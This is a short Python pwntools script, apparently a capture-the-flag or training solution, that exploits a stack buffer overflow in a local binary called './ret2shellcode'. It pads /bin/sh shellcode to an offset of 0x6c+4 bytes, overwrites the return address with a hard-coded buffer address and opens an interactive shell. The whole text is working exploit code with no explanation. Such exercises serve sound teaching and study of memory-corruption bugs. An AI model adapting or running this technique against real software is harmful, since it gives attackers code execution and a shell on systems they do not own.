from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
offset = 0x6c+4
shellcodepad = shellcode + (offset-len(shellcode))*b'A'

sh.sendline(shellcodepad + p32(buf2_addr))
sh.interactive()
